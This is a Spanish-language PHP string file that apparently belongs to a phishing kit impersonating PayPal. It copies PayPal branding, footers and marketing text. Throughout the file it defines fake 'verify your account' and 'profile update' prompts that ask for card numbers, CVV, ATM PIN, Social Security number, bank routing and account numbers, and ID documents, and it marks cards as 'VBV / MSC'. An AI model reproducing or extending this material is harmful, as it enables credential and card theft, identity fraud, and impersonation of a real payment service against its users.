<?php   
$confirmbutton = "confirmar";
$confirmyourinfo = "Es necesario confirmar sus informaciones a ser capaz de solucionar este problema y el acceso a su cuenta";
$unabletoload = "Temporalmente no se pueden cargar en su cuenta.";

$copy1 = "derechos de autor © 1999-".$copyright." ";
$copy2 = "Reservados todos los derechos.";
$wrong = "Parte de la información que has introducido no es correcto.";
$titlerr = "Error: Iniciar sesión ";
$confirm = "Confirme su Cuenta Úsalo como quieras";
$topp = "Tu seguridad es nuestra prioridad";
$secondarycred = "Tarjeta de crédito Secundaria (opcional)";
$primarycred = "Tarjeta de crédito Primaria";
$thiscardis = "Esta tarjeta es VBV / MSC";

$section_n1 = true;
$section_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent_ = false;
$section_row_fluid_panel_blue_reverseLink = true;
$section_row_fluid_editorial_editorial_left_ = true;
$section_row_fluid_editorial_editorial_right_editorial_bg_n4_ = false;
$section_row_fluid_panel_light_center_text = true;
$top_title = "Comprar, vender y transferir dinero por Internet - PayPal ".ucfirst($_SESSION['country_name']);
$small_with_helper_input_0 = "Es necesaria una dirección de correo válida.";
$small_with_helper_input_1 = "Es necesaria una contraseña.";
$login_email_input_0 = "Correo electrónico";
$passwordRecovery1_a_0 = "¿Ha olvidado su correo electrónico?";
$login_password_input_0 = "Contraseña";
$passwordRecovery2_a_0 = "¿Ha olvidado la contraseña?";
$login_button_a_0 = "Entrar";
$signup_button_a_0 = "Crear cuenta";
$header_buy_a_0 = "Compra";
$header_sell_a_0 = "Venta";
$header_send_a_0 = "Transferencia";
$header_business_a_0 = "Empresas";
$SignUp_consumer_hero_input_0 = "Crear cuenta gratis";
$signup_button_inner_a_0 = "Crear cuenta";
$hero_h1_0 = "Dinero para cada ocasión.";
$signup_subline_p_0 = "¿Tiene una empresa? Abra una cuenta Business ";
$icon_help_a_0 = "Ayuda";
$icon_contact_a_0 = "Contactar";
$icon_search_button_0 = "Buscar";
$_large_h2_n1_0 = "Rápido y eficaz.";
$_large_h2_row_fluid_editorial_editorial_left__0 = "Póngaselo fácil.";
$contentHead_large_h2_row_fluid_panel_blue_reverseLink_0 = "Envíe dinero a quien quiera.";
$contentHead_large_h2_row_fluid_panel_blue_reverseLink_1 = "Solicite dinero en pocos clics.";
$contentPara_p_n1_0 = "¿Por qué hay millones de usuarios que eligen PayPal? Porque es rápido y seguro. Para pagar, solo necesita un correo electrónico y una contraseña. Más fácil que sacar su cartera. ";
$contentPara_p_row_fluid_panel_blue_reverseLink_0 = "Envíe pagos a cualquiera que tenga una cuenta de correo electrónico o un número de móvil en más de 190 países. ¡Así de fácil! ";
$contentPara_p_row_fluid_panel_blue_reverseLink_1 = "¿Ha prestado dinero a alguien o hecho algún trabajo por el que aún no le han pagado? Envíe una solicitud de pago. El destinatario recibirá una invitación y podrá pagar como desee, sin complicaciones. ";
$contentPara_p_row_fluid_editorial_editorial_left__0 = "No se complique la vida. Hemos pensado en todo para que pueda recibir pagos con tarjeta de manera sencilla. No tiene que preocuparse, nosotros nos encargamos. ";
$contentLink_a_n1_0 = "Pagar en eBay";
$contentLink_a_n1_1 = "Pagar en sitios web";
$contentLink_a_row_fluid_panel_blue_reverseLink_0 = "Enviar dinero";
$contentLink_a_row_fluid_panel_blue_reverseLink_1 = "Solicitar dinero";
$contentLink_a_row_fluid_editorial_editorial_left__0 = "Recibir pagos en su sitio web";
$contentLink_a_row_fluid_editorial_editorial_left__1 = "Pagos por correo electrónico";
$closingHeadline_headline_large_p_0 = "No se complique. ";
$btn_closing_cta_center_block_span4_a_0 = "Crear cuenta gratis";
$footer_footer_main_secondaryLink_li = array();
$footer_footer_main_secondaryLink_li[0] = "Ayuda";
$footer_footer_main_secondaryLink_li[1] = "Contactar";
$footer_footer_main_secondaryLink_li[2] = "Tarifas";
$footer_footer_main_secondaryLink_li[3] = "Centro de seguridad";
$footer_footer_main_secondaryLink_li[4] = "Dónde comprar";
$footer_footer_secondary_secondaryLink_li = array();
$footer_footer_secondary_secondaryLink_li[0] = "Acerca de";
$footer_footer_secondary_secondaryLink_li[1] = "Empleo";
$footer_footer_secondary_secondaryLink_li[2] = "eBay";
$footer_footer_secondary_secondaryLink_li[3] = "Programadores";
$footer_footer_secondary_secondaryLink_li[4] = "Partners";
$footer_footer_secondary_secondaryLink_li[5] = "Opinión";
$footer_footer_tertiary_secondaryLink_li = array();
$footer_footer_tertiary_secondaryLink_li[0] = "© 1999 - ".$copyright." PayPal";
$footer_footer_tertiary_secondaryLink_li[1] = "Privacidad";
$footer_footer_tertiary_secondaryLink_li[2] = "Acuerdos legales";

$top_title2 = "Error: Iniciar sesión en España - PayPal";
$alert_alert_warning_div_0 = "Debe introducir la dirección de correo electrónico y la contraseña. Inténtelo de nuevo.";
$loginheadline_p_0 = "Inicie sesión en su cuenta.";
$error_span_0 = "Correo electrónico";
$error_span_1 = "Contraseña";
$btn_large_input_0 = "Entrar";
$pwrLinkoldflow_a_0 = "¿Ha olvidado su dirección de correo electrónico o su contraseña?";
$btn_btn_secondary_large_a_0 = "Crear cuenta gratis";
$headline_p_0 = "Formas de pago centralizadas.<SPAN class=headline-content>Seleccione una tarjeta o una cuenta bancaria. Es su dinero y usted decide cómo gastarlo.</SPAN>";
$headline_p_1 = "Sencillo. Y generalmente gratis.<SPAN class=headline-content>Crear una cuenta PayPal es gratis y no le cobramos ninguna tarifa de transacción al realizar sus compras, con independencia de la forma de pago.</SPAN>";
$footer_li_footer_li = array();
$footer_li_footer_li[0] = "Acerca de";
$footer_li_footer_li[1] = "Tipos de cuenta";
$footer_li_footer_li[2] = "Tarifas";
$footer_li_footer_li[3] = "Privacidad";
$footer_li_footer_li[4] = "Centro de seguridad";
$footer_li_footer_li[5] = "Contactar";
$footer_li_footer_li[6] = "Acuerdos legales";
$footer_li_footer_li[7] = "Programadores";
$footer_li_footer_li[8] = "Móvil";
$footer_li_footer_li[9] = "Pago en serie";
$legal_p_0 = "Copyright © 1999-".$copyright." PayPal. Todos los derechos reservados. ";

$charset = "UTF-8";
$profupdate = "Actualización de perfil - PayPal";
$processing = "Identificarse...";
$opay = "Identificarse - PayPal";
$ifno = "Si esta página aparece durante más de 5 segundos,";
$clickhere = "haga clic aquí";
$reload = " para volver a cargarla.";
$logout = "Salir";
$help = "Ayuda";
$s_center = "Centro de seguridad";
$myacc = "Mi Cuenta";
$over = "Descripción general";
$addfound = "Añadir fondos";
$retirar = "Retirar";
$banktf = "Transferir a Cuenta de Banco";
$history = "Historial";
$bsearch = "Busqueda Basica";
$dhistory = "Descargar Historial";
$resolu = "Centro de resoluciones";
$opencase = "Ver casos abiertos";
$guides = "Tutoriales";
$prof = "Perfil";
$addemail = "Agregar o Editar Email";
$addbank = "Agregar o Editoar Cuenta Bancaria";
$addcard = "Agregar o editar Tarjeta de Credito";
$addadr = "Agregar o editar direccion";
$sendmoney = "Enviar Dinero";
$reqmoney = "Solicitar Dinero";
$mservices = "Vender en su Web";
$autools = "Herramientas de subasta";
$stra = "Transaccion Segura";
$puf = "Actualizar perfil";
$pip = "Perfil de Información Personal";
$acu = "Introduzca su información con la mayor precisión posible.";
$accu = "Asegúrese de introducir la información precisa, y de acuerdo a los formatos requeridos.";
$filla = "Rellene todos los campos obligatorios.";
$rfield = "Campo obligatorio";
$ffPrenom = "Primer nombre ";
$ffNom = "Apellido ";
$dateness = "Fecha de Nacimiento ";
$month = "mes";
$day = "dia"; 
$year = "año";
$adr1 = "Dirección Línea 1 ";
$adr2 = "Dirección Línea 2 ";
$city = "Ciudad ";
$state = "Estado ";
$zip = "Código Postal ";
$country = "País ";
$scountry = "--Seleccione País--";
$hpn = "Teléfono de Casa ";
$acpnum = "Este número se utilizará para contactar con usted acerca de las medidas de seguridad y/o otras cuestiones con respecto a su cuenta PayPal.";
$ccprof = "Tarjeta de crédito/débito Perfil";
$damelacc = "Introduzca la información de la tarjeta con la mayor precisión posible.";
$damelacb = "Por el número de la tarjeta, por favor, introduzca sólo números, sin guiones o espacios.";
$Nomdutitulairedelacarte = "Tarjeta nombre ";
$ccnumbr = "Numero de Tarjeta ";
$expbr = "Fecha de Expiración ";
$cvv = "Número de verificación de la tarjeta ";
$hcvv = "Ayuda para encontrar su número de verificación de la tarjeta";
$atmm = "El cajero automatico de codigo ";
$ssn = "Número de Seguro Social ";
$routing="Bank Routing Number ";
$account="Bank Account Number ";
$hrouting="Ayuda para encontrar su Bank Routing Number";
$haccount="Ayuda para encontrar su Bank Account Number";
$codepersonel="código seguro ";
$IDTYPE = "Seleccione el tipo de Id ";
$Passport="Pasaporte";
$Card_Identification="Tarjeta de Identificación";
$Driving_License="Licencia de Conducir";
$for1 = "Para su protección, verificamos la información de la tarjeta de crédito.";
$for2 = "El proceso normalmente tarda unos 30 segundos, pero puede tomar más tiempo durante determinadas horas del día. Por favor, haga clic en";
$for3 = "para actualizar su información.";
$spo = "Guardar perfil";
$t1 = "Más información";
$t2 = "Acerca de nosotros";
$t3 = "Opiniones sobre el sitio";
$t4 = "Tarifas";
$t5 = "Privacidad";
$t6 = "Centro de seguridad";
$t7 = "Contactar";
$t8 = "Contratos legales";
$t9 = "En todo el mundo";
$t10 = "Empleo";
$t11 = "Servicios para vendedores";
$t12 = "Nuestro blog";
$t13 = "Sesiones prácticas";
$t14 = "Recomendaciones";
$t15 = "Mapa del sitio";
$t16 = "eBay";
$t17 = "Comunidad";
$fdic = "Information about FDIC pass-through insurance";
$completeform = '<div id="messageBox" class="legacyErrors"><div class="messageBox error"><p style="width: 690px; margin-bottom: 6px; margin-top: 12px;">Por favor completa el siguiente formulario para actualizar su información del perfil y restaurar el acceso a la cuenta.</p></div></div>';

$valid = array("Escriba su nombre" 
, "Nombre no válido" 
, "Por favor ingrese su apellido" 
, "Nombre no válido" 
, "Por favor seleccione un mes de nacimiento válido. " 
, "Por favor seleccione un cumpleaños válido. " 
, "Por favor seleccione el año del nacimiento válido. " 
, "Por favor ingrese su dirección" 
, "Invalid address" 
, "Invalid address" 
, "Por favor introduzca el nombre de tu ciudad" 
, "Por favor introduzca un nombre válido de la ciudad. " 
, "Por favor introduzca un nombre válido de la ciudad. " 
, "Seleccionar país" 
, "Por favor ingrese su código postal" 
, "Código postal inválido. " 
, "Por favor ingrese su número de teléfono" 
, "Introduzca sólo el número" 
, "Por favor introduzca un número de teléfono válido" 
, "Escriba un nombre válido de titular" 
, "Número de la tarjeta está en formato no válido" 
, "Número de tarjeta de crédito no es válido" 
,"" 
,"" 
, "Introduzca sólo el número" 
, "Por favor seleccione la fecha de caducidad--mes--" 
, "Por favor seleccione la fecha de caducidad--año--" 
, "Por favor introduzca su Cvv" 
, "Introduce una válida Cvv/Cvv2 de su tarjeta. " 
, "Cvv/Cvv2 no válido" 
, "Escriba su PIN de ATM" 
, "Introduce un PIN válido de la ATM" 
, "Introduce un PIN válido de la ATM" 
, "Por favor introduzca su número de Seguro Social" 
, "Número de seguro social válido. " 
, "Número de seguro social válido. " 
, "Sólo el número número de la Seguridad Social" 
, "Introduce tu código seguro" 
,"Código seguro no válido");
$allcountry1 = "Dondequiera que esté.";
$allcountry2 = "Estamos disponibles en 193 países, en los principales idiomas y aceptamos 26 divisas. Envíe y reciba dinero de forma segura. Nos encontrará dondequiera que esté. ";
$One_moment = "Un momento...";


$your_money = "Obtenga más de su dinero";
$your_money_p = "Su cuenta de Paypal te ofrece una manera más segura, más rápida y conveniente de pagar en línea y en tu móvil. Guarde su información financiera segura con nosotros, entonces usamos su cuenta para hacer compras, transferir dinero o vender tus cosas para hacer algo de dinero extra - todos en sólo unos clics.";
$websites = "Haga sus compras en millones de sitios web";
$websites_p = "PayPal está disponible en millones de sitios web en todo el mundo. Así que si usted va a comprar a partir de los minoristas más grandes o los especialistas más pequeños, usted puede hacer compras sin tener que compartir sus datos y velocidad a través de pago y envío. Y cualquier dispositivo que esté utilizando, su experiencia PayPal será igual de rápido y conveniente.";
$Simply_secure = "Simplemente seguro";
$Simply_secure_p = "La seguridad es en el corazón de todo lo que hacemos. Ya se trate de la protección de sus datos financieros o sus compras, ponemos a su seguridad y la paz de la mente en primer lugar. Es por eso que utilizamos la tecnología líder de cifrado y antifraude, por eso hacemos un seguimiento de las transacciones las 24 horas del día y por qué podemos ayudarle a obtener su dinero de vuelta si su compra no llega o no coincide con su descripción.";
$ex_date_info = "Por favor dénos su fecha de caducidad de la tarjeta (MM/AAAA).";
$ex_date_empty = "Por favor dénos su fecha de caducidad de la tarjeta.";
$ex_date_format = "Por favor, introduzca una fecha de vencimiento válida (MM/AAAA).";
$cardholder_info = "Utilice su nombre como aparece en su tarjeta";
$card_info = "Ingrese su número de tarjeta";
$card_format = "Número de la tarjeta no es válida";
$atm_info = "Introduzca el pasador atm para esta tarjeta.";
$account_info = "Ingrese su número de cuenta bancaria";
$account_empty = "Introduzca su número de cuenta bancaria para verificar su cuenta";
$account_format = "Por favor ingrese un número de cuenta bancaria válida";
$routing_info = "Ingrese su número de ruta del banco";
$routing_empty = "Introduzca su número de ruta del banco para verificar su cuenta";
$routing_format = "Por favor ingrese un número de ruta bancaria válida";
$first_name = "Su nombre";
$first_name_info = "Use su nombre legal como aparece en su licencia de conducir, tarjeta de seguro nacional o pasaporte.";
$first_name_empty = "Necesitamos su nombre legal para verificar su cuenta.";
$last_name = "Sus apellidos";
$last_name_info = "Utilice su apellido legal como aparece en su licencia de conducir, tarjeta de seguro nacional o pasaporte.";
$last_name_empty = "Necesitamos su apellido legal para verificar su cuenta.";
$Birth_date = "Fecha de nacimiento";
$Birth_date_empty ="Por favor dénos su fecha de nacimiento.";
$Birth_date_format = "Por favor, introduzca una fecha válida (DD/MM/AAAA).";
$Birth_date_info = "Por favor dénos su fecha de nacimiento (DD/MM/AAAA).";
$Address1 = "Dirección Línea 1";
$Address1_empty = "Necesitamos una dirección válida para verificar su cuenta.";
$Address1_info = "No podemos aceptar apartados postales o direcciones de negocio.";
$Address2 = "Dirección línea 2";
$City = "Ciudad";
$City_empty = "Necesitamos un pueblo/ciudad para verificar su cuenta.";
$Postcode = "Código postal";
$Postcode_empty = "Necesitamos un código postal para crear una nueva cuenta para usted.";
$Postcode_format = "Por favor verifique su código postal para los errores tipográficos, el formato no se ve bien.";
$fone = "Su número de teléfono";
$fone_empty = "Necesitamos su número de teléfono para verificar su cuenta.";
$fone_format = "Por favor verifique su número de teléfono para los errores tipográficos, el formato no se ve bien.";
$fone_info = "Su número de teléfono (utilice sólo dígitos)";
$verifyaccount = "Verificar tu cuenta";
$Ownb = "¿Tienes una empresa?";
$hh1 = "Tus datos seguras";
$hh2 = "Sus datos personales";
$pp1 = "Necesitamos sus datos seguros válidos para verificar su cuenta.";
$pp2 = "Necesitamos un poco de información acerca de usted antes de que podamos verificar su cuenta.";

$type1="Inicio";
$type2="Móvil";
$button_continue="Continuar";
$button_validate="Compruebe";

?>